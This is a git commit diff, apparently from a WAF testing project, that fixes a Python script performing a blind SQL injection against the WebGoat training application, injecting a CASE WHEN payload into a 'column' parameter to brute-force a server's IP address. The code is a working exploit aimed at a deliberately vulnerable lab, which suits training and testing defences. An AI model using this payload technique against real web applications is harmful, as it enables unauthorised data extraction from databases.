0b08d74287591ecfbc86042eb183c256bda5d1b9
yuta0709 <58354812+yuta0709@users.noreply.github.com>
2024-12-29 12:00:59 +0900

    🔨 SQLインジェクションスクリプトの修正

--- waf/attacker/scripts/sqli.py
+++ waf/attacker/scripts/sqli.py
@@ -3,7 +3,7 @@ import requests
 import argparse
 
 def sql_injection(jsessionid):
-    index = 0
+
 
     headers = {
         'Cookie': f'JSESSIONID={jsessionid}'
@@ -11,18 +11,19 @@ def sql_injection(jsessionid):
     
     for i in range(1, 256):
         
-        payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(index)
+        payload = '(CASE WHEN (SELECT ip FROM servers WHERE hostname=\'webgoat-prd\') LIKE \'{}.%\' THEN id ELSE hostname END)'.format(i)
 
         r = requests.get('http://webgoat:8080/WebGoat/SqlInjectionMitigations/servers?column=' + payload, headers=headers)
 
         try:
             response = json.loads(r.text)
+            print(response[0])
         except:
             print("Invalid JSESSIONID")
             return
 
         if response[0]['id'] == '1':
-            print('webgoat-prd IP: {}.130.219.202'.format(index))
+            print('webgoat-prd IP: {}.130.219.202'.format(i))
             return
 
 if __name__ == "__main__":
